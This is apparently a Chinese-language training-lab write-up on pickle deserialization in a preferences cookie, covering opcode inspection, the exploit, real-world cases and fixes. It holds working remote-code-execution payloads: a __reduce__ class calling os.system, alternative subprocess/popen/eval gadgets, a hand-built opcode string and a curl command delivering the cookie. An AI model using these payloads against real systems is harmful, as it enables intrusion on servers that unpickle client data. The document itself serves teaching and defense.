# 偏好 Cookie 里的 pickle 反序列化

## 这一题在教什么

**反序列化 = 执行对方给的代码。**

这是这一整类漏洞的核心，而 pickle 是它最直白的形态：

| 格式 | 字节流里有什么 |
|---|---|
| JSON / YAML（safe_load） | 只有数据。解出来就是一个 dict / list |
| XML（关掉外部实体） | 只有数据 |
| **pickle** | **数据 + "要 import 哪个名字、要调用哪个函数"** |

pickle 的格式是一串**操作码**。其中有两个关键的操作码：

- `GLOBAL` —— "import 这个名字"
- `REDUCE` —— "调用它"

所以 `pickle.loads` 不是"把字节变成对象"，是**按字节里的指令去执行一遍**。
能控制这段字节的人，就能决定服务端执行什么。

**pickle 没有"安全模式"。** 官方文档里写得很直接：

> Never unpickle data received from an untrusted or unauthenticated source.

## 漏洞在哪

`module.py`：

```python
raw = base64.b64decode(blob)
value = pickle.loads(raw)          # ← blob 来自 Cookie，完全由客户端控制
```

上游的 `blob` 是 `request.cookies.get("prefs")` 或者表单里的 `prefs` 字段 ——
两个入口都直接来自客户端。

## 怎么打通

### 第一步：看清 Cookie 里的东西

它是一段 base64，解出来是 pickle 字节流。用 `pickletools` 看操作码：

```bash
python3 -c "
import base64, pickletools, sys
pickletools.dis(base64.b64decode(sys.stdin.read().strip()))
" <<< "<把你的 Cookie 粘在这>"
```

你会看到 `GLOBAL` 和 `REDUCE`。

### 第二步：最短的那条链

`__reduce__` 返回一个元组 `(可调用对象, 参数元组)`，pickle 反序列化时会执行
`可调用对象(*参数元组)`：

```python
import base64, os, pickle

class Evil:
    def __reduce__(self):
        return (os.system, ("id > <应用数据目录>/proof.txt",))

print(base64.b64encode(pickle.dumps(Evil())).decode())
```

把打出来的那串填进页面的提交框，或者直接当 Cookie 发：

```bash
curl -b 'prefs=<那串>' 'http://<靶场>/v/deserialization/pickle_cookie/'
```

页面读到 `proof.txt` 就通了。

### 其他等价写法

```python
(subprocess.check_output, (["id"],))                    # 还能拿到输出
(os.popen, ("id",))                                     # 返回可读管道
(eval, ("__import__('os').system('id')",))
```

### 自己手搓字节流

不想写类也行 —— pickle 的字节流可以手拼：

```python
import base64
# b"cos\nsystem\n(S'id'\ntR." = GLOBAL('os','system') + 参数 + REDUCE
payload = base64.b64encode(b"cos\nsystem\n(S'id > /tmp/x'\ntR.")
```

这也是为什么"过滤掉 `os`、`system` 这些字符串"防不住 —— 字符串拼接、
`getattr`、`builtins` 里的别名，绕法多得是。

## 真实世界里的同一条链

| 场景 | 说明 |
|---|---|
| **Django 的签名 Cookie** | 早期 Django 把 session 序列化成 pickle 放进**签名** Cookie。签名只保证完整性 —— 一旦 `SECRET_KEY` 泄露，就能签出恶意 pickle → RCE。这是最著名的一例，也是"签名不等于加密"的经典教材 |
| **`torch.load` / `joblib.load`** | 加载别人给的模型文件 = 执行别人的代码。Hugging Face 上的一堆模型都踩过 |
| **`pandas.read_pickle`** | 同上 |
| Redis / Memcached 里的 session | 反序列化时执行 |
| 消息队列的任务负载 | Celery 早期默认用 pickle |
| Flask 的 session | **默认用的是签名 JSON**（`itsdangerous`），不是 pickle —— 这是 Flask 早期的一个正确决定 |

**注意"签名"这个陷阱**：签名保证"这段数据是我发出去的"，但**不保证"我发出去的时候它是无害的"**。
如果攻击者能让服务端自己签一段恶意数据（比如通过另一个反序列化点、或者拿到密钥），
签名就一点用都没有。

## 怎么修

**一、别用 pickle 传数据。**

```python
import json
value = json.loads(base64.b64decode(blob))
```

JSON 的格式里**只有数据**，没有"调用函数"这个能力。这是根治。

如果一定要用二进制序列化格式，选**有明确 schema** 的：`msgpack`（关掉扩展类型）、
`protobuf`、`avro`。不要用 `marshal`、`shelve`、`dill`、`joblib` 传不可信数据 ——
它们全都是 pickle 系。

**二、如果实在必须反序列化不可信数据，用受限的反序列化器。**

```python
import io
import pickle

class RestrictedUnpickler(pickle.Unpickler):
    # 白名单：只允许这几个安全的类
    SAFE = {
        ("builtins", "str"), ("builtins", "int"), ("builtins", "dict"),
    }
    def find_class(self, module, name):
        if (module, name) not in self.SAFE:
            raise pickle.UnpicklingError("不许 import %s.%s" % (module, name))
        return super().find_class(module, name)

RestrictedUnpickler(io.BytesIO(raw)).load()
```

**但要注意这只是缓解**：白名单要维护，而且 pickle 的反序列化缺陷是反复出现的
（`find_class` 的旁路、`__reduce__` 的变体）。有白名单也比没有好，但不如不用 pickle。

**三、别把"数据"放进客户端。**

这一题的整个设计就有问题：显示偏好这种小事，为什么要往返客户端？
服务端存一份（session 或者用户表）就完事了 —— 客户端只传 `theme=dark` 这样的
**单个值**，服务端自己做校验。

**四、给它加完整性保护不是修复。**

```python
signature = hmac.new(key, blob, hashlib.sha256).hexdigest()
```

这能挡住"改字节"，但挡不住"`SECRET_KEY` 泄露"或者"另一个反序列化点"。
它是纵深防御，不是修复。

## 顺手想想

- 如果这段 Cookie 加了 HMAC 签名，这一题还能打通吗？需要先拿到什么？
  （去 `flask_session/forged_cookie` 那道题看看那种思路）
- `pickle.loads` 之前先检查"解出来的必须是 dict"能防住这一题吗？为什么？
  （想清楚：`__reduce__` 是在**什么时候**被调用的）
- `yaml.safe_load` 和 `yaml.load`（不带 Loader）有什么区别？
  为什么说 `yaml.load` 的洞和这一题是同一类？
- 如果你的服务要接收别人上传的机器学习模型，有什么办法能安全地加载？
